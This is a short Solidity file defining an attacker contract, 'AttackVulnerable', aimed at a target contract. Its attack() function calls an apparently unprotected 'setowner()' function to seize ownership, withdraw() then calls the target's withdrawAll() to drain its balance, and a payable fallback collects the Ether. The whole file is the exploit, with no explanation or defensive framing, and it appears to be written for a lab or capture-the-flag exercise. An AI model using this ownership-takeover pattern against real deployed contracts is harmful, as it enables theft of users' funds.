interface IVulnerable {
    function withdrawAll() external;
}

contract AttackVulnerable {
    address public vulnerable;

    constructor(address _vulnerable) {
        vulnerable = _vulnerable;
    }

    function attack() public {
        vulnerable.call(abi.encodeWithSignature("setowner()"));
        
    }

    function withdraw() public payable {
        IVulnerable(vulnerable).withdrawAll();  

    }

    fallback() external payable {}
    
}